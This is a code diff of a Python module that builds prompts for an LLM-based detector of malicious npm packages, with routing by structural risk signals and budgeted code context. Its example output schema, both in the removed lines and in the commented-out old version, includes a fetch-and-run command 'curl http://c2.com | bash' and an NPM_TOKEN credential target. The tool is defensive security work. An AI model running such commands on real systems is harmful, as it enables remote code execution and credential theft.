@@ -9,7 +9,6 @@ import json
 import re
 from typing import Dict, List
 from analysis.signal_aggregator import StructuralContext
-from analysis.signal_aggregator import StructuralContext
 from analysis.structural_analysis import StructuralAnalysisFinding
 from data.models import PackageProfile, SemanticAnalysisResult, Behavior
 from enums.behavior_category import BehaviorCategory
@@ -25,13 +24,19 @@ SEMANTIC_OUTPUT_DIR = "./experiment_results/semantic_output"
 _CODE_BUDGET: Dict[str, int] = {
     "flag":   10_000,   # chars — full context, high priority
     "review":  7_000,   # chars — focused context
-    "skip":    4_000,   # chars — minimal, LLM does light scan
+    "skip":    4_000,   # chars — minimal, LLM does independent scan
 }
 
 class SemanticPromptAnalysis:
     """Templates for semantic analysis prompts.
     Uses StructuralContext (from SignalAggregator) as the primary anchor —
     LLM is asked to verify/expand on structural signals, not re-analyze from scratch.
+
+    4 analysis cases based on routing × has_js_source:
+        FLAG/REVIEW + has_js   → verify confirmed signals + scan code
+        FLAG/REVIEW + no js    → verify from hook commands + metadata only
+        SKIP        + has_js   → independent scan, no prior bias
+        SKIP        + no js    → metadata-only reasoning
     """
         
     @classmethod
@@ -50,7 +55,15 @@ class SemanticPromptAnalysis:
         self.package = package_profile
         self.ctx = structural_context
         self._routing = structural_context.routing  # "flag" | "review" | "skip"
- 
+
+    @property
+    def _has_js_source(self) -> bool:
+        """True if any JS source is available for LLM to read."""
+        return bool(
+            (self.package.entry_point_code or "").strip()
+            or (getattr(self.package, "install_script_files", {}) or {})
+        )
+
     def save_parsed_output(self, parsed_data: dict, version_tag: str) -> dict:
         """Persist parsed LLM output to JSON"""
         os.makedirs(SEMANTIC_OUTPUT_DIR, exist_ok=True)
@@ -81,51 +94,50 @@ class SemanticPromptAnalysis:
     # ------------------------------------------------------------------
     # Prompt sections
     # ------------------------------------------------------------------
- 
+
     def _system(self) -> str:
         return (
             "You are a JavaScript supply chain security analyst. "
             "Your task is to identify malicious behaviors in npm packages "
             "based on static analysis evidence and source code. "
-            "Do NOT flag standard minified code, bundlers, or legitimate "
-            "third-party library usage. "
+            "Do NOT flag standard minified code, bundlers, or legitimate third-party library usage."
             "Output ONLY valid JSON — no prose, no markdown fences."
         )
- 
+
     def _user(self) -> str:
         parts = []
- 
-        # 1. Package metadata (always included, compact)
+
+        # Package metadata (always included, compact)
         parts.append(self._format_metadata())
- 
-        # 2. Structural pre-analysis block (the anchor)
+
+        # Structural pre-analysis block (the anchor)
         parts.append(self._format_structural_anchor())
- 
-        # 3. Code to analyze (budget-controlled)
+
+        # Code to analyze (budget-controlled)
         parts.append(self._format_code_context())
- 
+
         return "\n\n".join(parts)
- 
+
     def _instructions(self) -> str:
         categories = [c.value for c in BehaviorCategory]
- 
+
         output_schema = {
             "behaviors": [
                 {
                     "category": categories[0],
                     "summary": "One sentence: what malicious action does this take?",
                     "details": "Technical evidence: which API, file, line, domain",
-                    "confidence": "0.0 to 1.0",
-                    "evidence_apis": ["https.request", "child_process.exec"],
-                    "evidence_files": ["preinstall.js"],
-                    "evidence_domains": ["evil.com"],
-                    "evidence_commands": ["curl http://c2.com | bash"],
-                    "evidence_env_vars": ["NPM_TOKEN"],
+                    "confidence": 0.0,
+                    "evidence_apis": [],
+                    "evidence_files": [],
+                    "evidence_domains": [],
+                    "evidence_commands": [],
+                    "evidence_env_vars": [],
                 }
             ],
             "risk_vector": [categories[0]],
         }
- 
+
         anchor_instruction = {
             "flag": (
                 "The structural pre-analysis above flagged HIGH-CONFIDENCE signals. "
@@ -138,32 +150,158 @@ class SemanticPromptAnalysis:
                 "and look for any additional issues in the code."
             ),
             "skip": (
-                "The structural pre-analysis found no significant signals. "
-                "Perform a light scan of the code for any suspicious behavior "
-                "that static analysis may have missed."
+                "The structural pre-analysis found no significant signals — "
+                "but static analysis has limited coverage and may miss obfuscated "
+                "or novel malware. Perform an INDEPENDENT scan of the code below. "
+                "Do not assume the package is clean."
             ),
         }[self._routing]
- 
+
         return f"""INSTRUCTIONS:
-                {anchor_instruction}
-                
-                Analysis principles:
-                - Evidence-based: every behavior must cite specific API calls, files, or commands
-                - Intent-focused: describe what the malicious code DOES to the victim, not mechanics
-                - Conservative: if genuinely ambiguous, lower confidence (< 0.5) or omit
-                - Do NOT report standard library usage (https, fs, path) as malicious without context
-                - The 'risk_vector' list must contain each category ONCE (deduped)
-                
-                Output schema (fill exactly, no extra fields, no behavior_id):
-                {json.dumps(output_schema, indent=2)}
-                
-                Valid categories: {", ".join(categories)}
-                Output ONLY the JSON object. No explanation, no markdown."""
-    
+{anchor_instruction}
+
+Analysis principles:
+- Evidence-based: every behavior must cite specific API calls, files, or commands
+- Intent-focused: describe what the malicious code DOES to the victim, not mechanics
+- Conservative: if genuinely ambiguous, lower confidence (< 0.5) or omit
+- Do NOT report standard library usage (https, fs, path) as malicious without context
+- The 'risk_vector' list must contain each category ONCE (deduped)
+- If no suspicious behavior found, return behaviors=[] and risk_vector=[]
+
+Confidence scoring guide:
+  0.9-1.0 : explicit malicious payload (reverse shell, exfil to known C2)
+  0.7-0.89: strong signal (credential access + network call)
+  0.5-0.69: suspicious but ambiguous
+  < 0.5   : weak signal, include only if part of a pattern
+
+Output schema (fill exactly, no extra fields):
+{json.dumps(output_schema, indent=2)}
+
+Valid categories: {", ".join(categories)}
+Output ONLY the JSON object. No explanation, no markdown."""
+
+    # ------------------------------------------------------------------
+    # Metadata + structural anchor  (previously missing — added here)
+    # ------------------------------------------------------------------
+
+    def _format_metadata(self) -> str:
+        """Compact package identity block — always included regardless of routing."""
+        pkg = self.package
+        scripts = pkg.scripts or {}
+        hook_keys = [
+            k for k in scripts
+            if k in ("preinstall", "install", "postinstall", "prepare", "prepublish")
+        ]
+
+        lines = [
+            "PACKAGE METADATA:",
+            f"  Name    : {pkg.package_name}",
+            f"  Version : {pkg.version}",
+        ]
+        if hook_keys:
+            lines.append(f"  Hooks   : {', '.join(hook_keys)}")
+            for k in hook_keys:
+                lines.append(f"    {k}: {str(scripts[k])[:120]}")
+
+        all_deps = {**(pkg.dependencies or {}), **(getattr(pkg, "dev_dependencies", {}) or {})}
+        if all_deps:
+            dep_str = ", ".join(f"{k}@{v}" for k, v in list(all_deps.items())[:8])
+            lines.append(f"  Deps    : {dep_str}")
+
+        return "\n".join(lines)
+
+    def _format_structural_anchor(self) -> str:
+        """
+        Format StructuralContext as LLM priming anchor.
+
+        4 cases — routing × has_js_source:
+
+        Case 1: FLAG/REVIEW + has_js_source=True
+            → confirmed signals + code available below
+        Case 2: FLAG/REVIEW + has_js_source=False
+            → confirmed signals, NO code (metadata-only / hook-based attack)
+            → tell model to verify from hook commands in metadata
+        Case 3: SKIP + has_js_source=True
+            → no structural signals, but code available
+            → independent scan, do not assume clean
+        Case 4: SKIP + has_js_source=False
+            → no signals AND no code — very limited analysis possible
+            → model can only reason from package metadata
+        """
+        ctx = self.ctx
+
+        # ------------------------------------------------------------------
+        # Case 3 & 4: SKIP
+        # ------------------------------------------------------------------
+        if self._routing == "skip":
+            lines = [
+                "STRUCTURAL PRE-ANALYSIS:",
+                f"Routing: SKIP",
+                f"Risk Score: {ctx.risk_score:.2f}",
+                "Result: No signals detected by static analysis.",
+            ]
+            if self._has_js_source:
+                # Case 3: code available — independent scan
+                lines += [
+                    "IMPORTANT: Static analysis has limited coverage — "
+                    "regex/AST patterns may miss obfuscated payloads, "
+                    "novel C2 patterns, or logic bombs.",
+                    "Perform an INDEPENDENT scan of the code below. "
+                    "Do not assume the package is clean.",
+                ]
+            else:
+                # Case 4: no code either — very limited
+                lines += [
+                    "NOTE: No JS source available AND no structural signals.",
+                    "nalyze based on package metadata only (name, version, hooks, deps). "
+                    "Flag only if metadata itself is suspicious "
+                    "(e.g. typosquatting, version inflation, suspicious hook commands).",
+                ]
+            return "\n".join(lines)
+
+        # ------------------------------------------------------------------
+        # Case 1 & 2: FLAG / REVIEW
+        # ------------------------------------------------------------------
+        lines = [
+            "STRUCTURAL PRE-ANALYSIS:",
+            f"  Routing    : {ctx.routing.upper()}",
+            f"  Risk Score : {ctx.risk_score:.2f}",
+            f"  Confidence : {ctx.confidence:.2f}",
+            f"  Primary    : {ctx.primary_category.value if ctx.primary_category else 'none'}",
+        ]
+
+        if ctx.confirmed_signals:
+            lines.append(f"\n  Confirmed signals ({len(ctx.confirmed_signals)}):")
+            for s in ctx.confirmed_signals[:5]:   # cap at 5 to save tokens
+                sig_lines = s.strip().splitlines()
+                for sl in sig_lines[:2]:           # Signal + Location only, skip Code line
+                    lines.append(f"    [!] {sl.strip()}")
+
+        if ctx.supporting_signals:
+            lines.append(f"\n  Supporting signals ({len(ctx.supporting_signals)}):")
+            for s in ctx.supporting_signals[:3]:
+                first = s.strip().splitlines()[0]
+                lines.append(f"    [-] {first.strip()}")
+
+        if not self._has_js_source:
+            # Case 2: signals exist but no JS code to read
+            lines.append(
+                "\n  NOTE: No JS source available. "
+                "This is likely a hook-based attack — payload executes at install time "
+                "via the commands listed in PACKAGE METADATA above. "
+                "Verify malicious intent from hook commands and structural signals only."
+            )
+
+        return "\n".join(lines)
+
+    # ------------------------------------------------------------------
+    # Code context (budget-controlled)
+    # ------------------------------------------------------------------
+
     def _format_code_context(self) -> str:
         """
         Assemble code sections within token budget.
- 
+
         Priority order:
         1. install_script_files (highest risk, usually small)
         2. install_script_content (hook command string)
@@ -172,7 +310,7 @@ class SemanticPromptAnalysis:
         budget = _CODE_BUDGET.get(self._routing, 6_000)
         sections = []
         used = 0
- 
+
         # Priority 1: Install script files (JS called from hooks)
         install_files = getattr(self.package, "install_script_files", {}) or {}
         for filename, code in install_files.items():
@@ -190,7 +328,7 @@ class SemanticPromptAnalysis:
             used += len(snippet)
             if used >= budget:
                 break
- 
+
         # Priority 2: Install hook command (raw string — usually short)
         install_cmd = self.package.install_script_content or ""
         if install_cmd.strip() and used < budget:
@@ -198,7 +336,7 @@ class SemanticPromptAnalysis:
             if used + len(snippet) <= budget:
                 sections.append(snippet)
                 used += len(snippet)
- 
+
         # Priority 3: Entry point code
         entry = self.package.entry_point_code or ""
         if entry.strip() and used < budget:
@@ -211,152 +349,16 @@ class SemanticPromptAnalysis:
             else:
                 entry_snippet = f"ENTRY POINT (main):\n```javascript\n{entry}\n```"
             sections.append(entry_snippet)
- 
+
         if not sections:
             return "CODE: No source files available for analysis."
- 
+
         return "CODE TO ANALYZE:\n" + "\n\n".join(sections)
-    
-    # def _format_structural_context(self) -> str:
-    #     """Format structural analysis findings (prioritize suspicious ones from structural analysis)."""
-    #     if not self.structural_risks:
-    #         return "STRUCTURAL ANALYSIS: Not detected.\n"
-
-    #     severity_order = {
-    #         "critical": 0,
-    #         "high": 1,
-    #         "medium": 2,
-    #         "low": 3
-    #     }
-    #     sorted_risks = sorted(self.structural_risks, key=lambda r: severity_order.get(r.severity.value, 99))
-
-    #     context = "STRUCTURAL ANALYSIS:\n"
-    #     for risk in sorted_risks:
-    #         context += f"- [{risk.severity.value.upper()}] {risk.risk_type}: {risk.evidence[:100]}\n"
-    #     return context
-    
-    # def _format_dependencies(self) -> str:
-    #     """Format dependency list (prioritize suspicious ones from structural analysis)."""
-    #     all_deps = {**self.package.dependencies, **self.package.dev_dependencies, **self.package.peer_dependencies}
-        
-    #     if not all_deps:
-    #         return "None"
-        
-    #     sus_dep = set()
-    #     for risk in self.structural_risks:
-    #         if "dependency" in risk.risk_type.lower():
-    #             match = re.search(r"'([^']+)'", risk.evidence)
-    #             if match:
-    #                 sus_dep.add(match.group(1))
-        
-    #     res_list = []
-    #     for dep, version in list(all_deps.items())[:10]:
-    #         marker = "[SUSPICIOUS]" if dep in sus_dep else ""
-    #         res_list.append(f"{dep}@{version}{marker}")
-        
-    #     return ", ".join(res_list)
-    
-    # def _get_system_message(self) -> str:
-    #     """System messages for the prompt."""        
-    #     return (
-    #         "You are a JavaScript cybersecurity analyst, your task is to review open-source dependencies in client and server-side JavaScript code for potentially malicious behavior or sabotage."
-    #         "for malicious behavior, supply chain attacks, and other security risks. "
-    #         "Do NOT flag standard minified code or third-party library usage alone."
-    #         "FILL THE JSON SKELETON BELOW based ONLY on the provided files."
-    #     )
-
-        
-    
-    # def _get_user_message(self) -> str:
-    #     """User messages for the prompt."""
-        
-    #     structural_context = self._format_structural_context()
-    #     dependencies = self._format_dependencies()
-        
-    #     code_context = []
-        
-    #     if self.package.install_script_content:
-    #         code_context.append(
-    #             f"INSTALL SCRIPT\n"
-    #             f"```javascript\n{self.package.install_script_content}\n```\n"
-    #         )
-            
-    #     if self.package.entry_point_code:
-    #         code_context.append(
-    #             f"ENTRY POINT CODE (main)\n"
-    #             f"```javascript\n{self.package.entry_point_code}\n```\n"
-    #         )
-            
-    #     if code_context:
-    #         code_context_str = "\n".join(code_context)
-    #     else:
-    #         code_context_str = "No code snippets available."
-        
-    #     return f"""
-    #         PACKAGE METADATA:
-    #         - Name: {self.package.package_name}
-    #         - Version: {self.package.version}
-    #         - Dependencies: {dependencies}
-    #         - Has Install Scripts: {bool(self.package.scripts)}
-    #         - Structural context: 
-    #         {structural_context}
-
-    #         CODE TO ANALYZE:
-    #         {code_context}
-    #         """
-                
-        
-    # def _get_instructions(self) -> str:
-    #     """Instructions for the prompt."""
-    #     categories = self.get_behavior_categories()
-        
-    #     output_schema = {
-    #         "behaviors": [
-    #             {
-    #                 "category": categories[0], 
-    #                 "summary": "One sentence: what malicious action does this take?",
-    #                 "details": "Technical evidence: which API, file, line, domain",
-    #                 "confidence": "0.0 to 1.0",
-    #                 "evidence_apis": ["https.request", "child_process.exec"],
-    #                 "evidence_files": ["preinstall.js"],
-    #                 "evidence_domains": ["evil.com"],
-    #                 "evidence_commands": ["curl http://c2.com | bash"],
-    #                 "evidence_env_vars": ["NPM_TOKEN"]
-    #             }
-    #         ],
-    #         "risk_vector": categories[:2]
-    #     }
-
-
-    #     return f"""
-    #         INSTRUCTIONS:
-    #         1. Analyze the provided code snippets and structural analysis context.
-    #         2. Identify any potential malicious behaviors, supply chain attacks, or security risks.
-    #         3. For each identified behavior, classify it into one of the following categories: {', '.join(categories)}.
-    #         4. Provide a brief explanation for each identified behavior (short ver).
-    #         5. Assign confidence scores based on evidence clarity.
-    #         6. DO NOT include 'behavior_id' field in your response - IDs will be generated automatically.
-    #         7. Include evidence arrays (evidence_apis, evidence_files, etc.) even if empty.
-
-    #         ANALYSIS PRINCIPLES:
-    #         1. Context-Aware: Interpret code within package context (dependencies, scripts, structure)
-    #         2. Evidence-Based: Ground all findings in observable API calls, functions, system interactions
-    #         3. Intent-Focused: Describe malicious INTENT, not just implementation mechanics
-    #         4. Conservative Confidence: Lower confidence for ambiguous evidence
-    #         6. The "confidence" field is a float in [0,1] summarizing aggregated confidence.
-    #         7. The 'risk_vector' field should contain a list of UNIQUE behavior categories found in this package. Include each category only ONCE, even if multiple behaviors share the same category.
-            
-    #         OUTPUT REQUIREMENTS:
-    #         - Use EXACTLY this JSON schema: {json.dumps(output_schema, indent=2)}
-    #         - Categories must be from: {', '.join(categories)}
-    #         - Each behavior needs concrete evidence
-    #         - DO NOT include 'behavior_id' in your JSON response
-    #         - Output ONLY JSON, no other text
-    #         """
 
     # ------------------------------------------------------------------
     # Public
     # ------------------------------------------------------------------
+
     def build_prompt(self) -> Dict[str, str]:
         """Return {system, user, instructions} dict for the LLM call."""
         return {
